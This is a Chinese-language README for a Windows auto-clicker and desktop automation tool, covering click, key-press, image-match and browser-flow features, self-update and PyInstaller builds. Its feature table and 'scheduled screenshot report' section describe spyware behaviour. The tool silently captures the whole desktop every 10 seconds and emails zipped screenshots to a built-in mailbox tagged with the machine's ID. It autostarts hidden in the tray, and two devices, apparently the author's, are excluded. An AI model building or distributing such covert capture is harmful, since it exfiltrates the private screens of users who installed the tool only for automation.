# 清风自动化键鼠工具

Windows 桌面自动化小工具：**鼠标连点 / 键盘连按 / 屏幕找图点击**，全部支持
**全局热键启停**、**次数与时长双停止条件**，常驻系统托盘，任务栏与托盘均可唤出窗口。

## 功能

| 功能 | 说明 | 默认启停热键 |
| --- | --- | --- |
| 鼠标连点 | 左/右/中键，单击/双击，间隔可调，位置可跟随鼠标或固定坐标 | `F6` |
| 键盘连按 | 单键或组合键（如 `Ctrl+C`），间隔可调 | `F7` |
| 找图点击 | 屏幕截图选区做模板，OpenCV 模板匹配，命中后点击，支持多图任务列表 | 首个任务 `F8`，之后 `F9`/`F10`… |
| 自动化流程 | 把上述功能封装为模块，拖拽编排成流程依次执行，可循环、可绑定热键 | 每个流程可单独设置（默认无） |
| 定时截屏上报 | 每 10 秒截取全屏（含多显示器）存入 `cap-img-toupai` 目录，每 5 分钟打包 zip 发送到邮箱后清空；发送失败保留重试，积压自动丢弃最旧 | 后台自动运行 |

## 自动化流程

「自动化流程」标签页 → 新建流程 → 把模块面板中的 **鼠标点击 / 键盘连按 / 找图点击 /
延时等待 / 网页操作** 拖入步骤列表（可拖动排序、双击改参数）→ 运行。

- 每个步骤的参数是**独立副本**，与主界面设置互不影响
- **单步执行**：点步骤右侧「▶ 执行」只运行该模块，便于逐个调试后再整体运行
- **独立存储**：每个流程一个文件 `flows/<流程名>.json`（重名流程自动加 `_id` 后缀；旧版 config.json 内嵌流程及按 id 命名的文件在加载时自动兼容迁移）；「📥 导入流程 / 📤 导出流程」可备份、恢复或分享单个流程
- 找图步骤超时未找到目标默认**终止流程**，可勾选"失败继续"跳过该步
- 执行轮数：1~9999 或 0=无限循环（配合紧急停止热键使用）
- 每个流程可绑定独立启停热键；紧急停止热键会停止包括流程在内的一切任务
- 防呆：流程中"次数无限且时长不限"的步骤按执行 1 次处理，避免流程卡死
- **开机自启**：每次启动自动检查并写入注册表（HKCU Run 键），注册的是当前程序 exe 的绝对路径（源码运行时自动探测 `dist\` 里的成品 exe）；开机自启进入时主窗口隐藏、仅托盘运行，双击打开则正常显示窗口
- **在线更新**：`config.json` 的 `version` 字段（默认 1.0.0）为当前程序版本；启动后自动与仓库 `dist/config.json` 的 `version` 比对，发现新版本弹窗提示，确认后带进度条下载新 exe 并自动替换本程序（当前 exe 改名 `.old` 备份），程序关闭后自动删除备份并重新打开最新版本

### 🌐 网页操作（DrissionPage）

在流程里直接操控 Chrome/Edge 浏览器。模块面板拖入「网页操作」后双击改参数，三种子动作：

| 操作 | 参数 |
|---|---|
| **打开网址** | 网址（不带 `http` 前缀会自动补 `https://`）、打开方式、当前标签/新标签、加载超时、打开后等待 |
| **关闭标签页** | 关闭当前标签 / 关闭其他标签 / 关闭网址或标题包含指定文字的标签 |
| **关闭浏览器** | 退出整个浏览器并释放会话 |

**打开方式**三选一，**默认前台**：

- **前台显示** —— 正常弹出浏览器窗口
- **无头模式** —— 不显示窗口，纯后台跑
- **后台静默** —— 保留真实浏览器窗口但挪到屏幕外，不抢焦点。比无头模式更不容易被网站识别为自动化程序

要点：

- **浏览器会话全流程共用**。同一条流程里「打开网址 → 找图点击 → 关闭浏览器」操作的是同一个浏览器，登录态和 Cookie 会保留；每步各起一个浏览器既慢又会丢登录态。
- **打开方式只在首次启动浏览器时生效**。浏览器已经开着时再选别的模式，会沿用现有实例并在结果里注明，不会为了换模式把浏览器杀掉。想换模式就先插一个「关闭浏览器」步骤。
- 机器上需要装有 Chrome 或 Edge（DrissionPage 会自动查找系统 Chrome）。
- 步骤失败默认终止流程，可勾选「本步失败时跳过」。
- 程序退出时会自动关闭流程还开着的浏览器，不会残留 Chrome 进程。

## 定时截屏上报

- 每 10 秒截取整个桌面（JPEG，含多显示器）存入程序目录 `cap-img-toupai/`（自动创建）；
  每 5 分钟把目录内全部截图打包 zip 发送到收件邮箱，发送成功后清空目录
- 邮箱参数在 config.json：`mail_user`（发件）、`mail_auth_code`（SMTP 授权码，**已内置默认值，
  首次运行自动写入 config.json**，如需更换直接改该字段）、`mail_to`（收件，可逗号分隔多个）、
  `mail_host`/`mail_port`（默认 smtp.qq.com:465）、`capture_interval_sec` / `send_interval_min`（间隔可调）
- QQ 邮箱需开启 SMTP 服务（网页版邮箱 → 设置 → 账户 → POP3/SMTP 服务）；授权码失效时发送会
  失败并保留截图自动重试
- 发送失败保留文件下轮重试；目录积压超过 600 张自动丢弃最旧；单封附件超 40MB 自动分包
- 邮件标题/正文带设备 ID（注册表 MachineGuid），便于区分来源设备
- **排除名单**存在 config.json 的 `capture_excluded_ids`（逗号分隔，默认已含
  `6EBFD7E0-...` 与 `030521b0-...` 两台设备，缺字段时首次运行自动写入）；
  命中的设备不截图也不发邮件，修改名单后下个周期即时生效

## 发布新版本（在线更新）

版本检测**优先读 Gitee「最新发行版」API**（tag 即版本号，附件直链优先下载），
仓库 `dist/config.json` 的 `version` 仅作 API 不可用时的兜底，更新后本地 version 写为 tag 原文（如 `v3.0.1`）。

1. `build.bat` 打包新 exe
2. 在 Gitee 建对应 tag 的发行版（如 `v1.0.2`），上传新 exe 作为附件，文件名保持
   `清风自动化键鼠工具.exe`（Gitee raw 链接对大文件需要登录，exe 必须走 Release 附件分发）

- **停止条件**：每个任务可设「执行次数（0=无限）」与「持续时长（0=不限）」，
  任一满足即自动停止；界面实时显示已执行次数与用时。
- **全局热键**：所有启停热键均可在界面内自定义录制（点击输入框后按键）。
- **托盘**：左键单击托盘图标 = 显示/隐藏主窗口；右键菜单可快捷启停、全部停止、退出。
  点主窗口的 X 是隐藏到托盘，**退出请用托盘右键菜单**。
- **显示/隐藏主窗口**：默认 `Shift+F1`（切换）。窗口隐藏时显示并置顶到屏幕最前，
  已在最前时再按隐藏。
- **紧急停止**：默认 `Shift+F2`，一键停止所有任务（含流程）。任务失控时立即使用。

## 运行（源码）

```bash
pip install -r requirements.txt
python main.py
```

需要 Python 3.10+（开发环境 3.12）。Windows 下 keyboard 库需管理员权限的场景：
以管理员身份运行终端/程序即可。

## 跑测试

```bash
python -m unittest discover -s tests -v
```

覆盖的是不依赖界面的纯逻辑：配置兼容迁移、版本比对、热键解析、抓屏间隔、
单实例锁的 PID 解析。这些地方改坏了不会报错，只会在用户运行时才暴露，
所以钉了测试。跑测试前不需要打包，也不会改动你真实的 `config.json` / `flows\`——
`tests/_env.py` 会把运行期目录重定向到临时目录。

## 打包成 exe

双击 `build.bat`（或命令行执行），使用 **PyInstaller** 打包，完成后得到：

```
dist\清风自动化键鼠工具.exe
```

单文件、免安装，不需要 C 编译器。
`config.json`、`templates\`、`flows\`、`app.log` 首次运行时自动生成在 exe 同级目录。
注意：打包前请先退出正在运行的程序（含托盘），否则 exe 被占用会打包失败
（脚本会自动检测并提示）。

### 构建命令

```bash
python build.py               # 打包（默认 onefile 单文件，复用缓存）
python build.py --dir         # onedir 目录模式，启动更快，适合改完代码快速验证
python build.py --clean       # 清空缓存全量重打（换依赖/报奇怪错时用）
python build.py --console     # 保留控制台窗口（排查启动崩溃用）
```

### 实测耗时（20 核 / PyInstaller 6.15.0 / Python 3.12.10）

| 命令 | 耗时 | 产物 |
|---|---|---|
| `python build.py` | **54 秒** | 104.9 MB 单文件 |
| `python build.py --dir` | **34 秒** | 目录 |
| 零改动重跑 | 51 秒 | 增量只省 3 秒 |

作为对比，**此前用 Nuitka 是 7 分 13 秒，换成 PyInstaller 快了约 8 倍**。

注意：PyInstaller 的耗时大头是把 100 多 MB 内容压缩成单文件，跟改了多少代码
关系不大，所以增量构建省不出多少时间——这点跟 Nuitka 不一样（Nuitka 的增量
反过来更难生效，因为它要重新编译 C）。想更快就用 `--dir` 跳过压缩。

### 为什么从 Nuitka 换成 PyInstaller

| | Nuitka | PyInstaller |
|---|---|---|
| 原理 | 每个模块翻译成 C 再编译链接 | 复制 .pyc + dll 直接打包 |
| onefile 耗时 | 7 分 13 秒 | **54 秒** |
| 产物体积 | 64.1 MB | 104.9 MB |
| 代码保护 | 编译成机器码 | .pyc 字节码，可被反编译 |
| 需要 C 编译器 | 是（MinGW） | 否 |

关键差异在 cv2：`cv2/__init__.py` 用 `os.listdir()` + `importlib.import_module()`
动态加载全部子模块，Nuitka 静态判定不了，只能把 aruco / dnn / face / cuda… 68 个
子模块全部编成 C。PyInstaller 直接把 `cv2.pyd` 整个复制进包，动态导入在运行时由
pyd 自己解析，打包侧完全不用管。

代价要说清楚：产物从 64.1 MB 涨到 104.9 MB，且代码是字节码可被反编译。自用工具
可接受；若需保密请回到 Nuitka，或把关键模块 Cython 化。

### 已剔除的内容

脚本排除了本项目用不到的大块内容以控制体积：

- PySide6 的 WebEngine / Qml / Quick / 3D / Charts / Multimedia 等 Qt 模块
  （WebEngine 单独就有约 100 MB）
- numpy 的 `testing` / `distutils` / `f2py` 子树
- `tkinter`、`unittest`、`setuptools`、`pip`、`defusedxml`、`PIL.ImageTk`、`PIL.ImageQt`

> 如果以后要加音频、图表、内嵌网页、打印等功能，记得从 `build.py` 的
> `EXCLUDES` 列表里删掉对应项，否则运行时会 `ModuleNotFoundError`。

另外显式声明了三个隐藏导入：`pynput.keyboard._win32`、`pynput.mouse._win32`、
`mss.windows`——这三个库按 `sys.platform` 拼模块名做动态导入，静态分析扫不到。

### 多 Python 环境

这台机器装了多个 Python，项目依赖只装在 3.12 上，而 PATH 上排在前面的可能是
别的版本。`build.py` 会先检查当前解释器能否 import 全部依赖，不匹配就自动切换
到装了依赖的那个 Python 重跑，不需要手动指定解释器。

### 启动异常怎么查

程序日志写在 exe 同级的 `app.log`。

> 如果日志只到 `=== 启动 ===` 就没有后续的「热键注册成功」，多半是上次强杀进程
> 留下了陈旧的单实例锁文件，导致这次启动被判定为「程序已在运行中」而静默退出。
> 删掉 `%TEMP%\qingfeng_automation_tool.lock` 后重试即可。
> 另外 cv2 那 68 个子模块减不掉：强行 `--nofollow-import-to` 排除会让
> 运行时 `import cv2` 直接抛 ImportError。

## 找图点击使用说明

1. 在「找图点击」页点 **添加模板**，屏幕变暗后拖拽框选目标区域；松开后进入**调整态**：
   拖动选区移位、拖边角改大小、框外重新框选，**双击确认**保存模板（Esc 取消）；
2. 双击行打开编辑对话框：可设置间隔、置信度、点击方式、偏移、次数/时长、热键；
   **找图区域**默认全屏，点「框选区域」拖拽（同样支持调整后双击确认）后只在该范围
   内找图（更快、不易误点），点「恢复全屏」还原；新任务默认命中 1 次即自动停止，
   可自行改大或设 0（无限）；
3. 用热键或「启动」开始：程序按节奏在区域内找图，命中置信度阈值即点击目标中心+偏移；
4. 「搜索超时」= 一直没找到目标时等待多久后停止（0=一直等）。

> 注意：模板匹配对屏幕缩放/分辨率敏感，截图与运行时需保持一致（缩放 100%~150% 都可，
> 但前后要相同）。多显示器下找图区域/模板使用虚拟桌面物理像素坐标。

## 配置

所有参数自动保存到 `config.json`；找图模板保存在 `templates\` 目录。
运行日志写入 `app.log`（热键注册/触发记录，排查热键冲突时查看）。

## 已知限制

- 单键热键（如 `F6`）采用全局拦截，按下后不会传给其他程序；组合键热键不拦截。
- 找图为固定分辨率模板匹配，不支持目标缩放变化。
- 网页操作依赖本机装有 Chrome 或 Edge；没装的话「打开网址」会直接报启动失败。
- 请勿将本工具用于游戏外挂等违反服务条款或法律的用途。
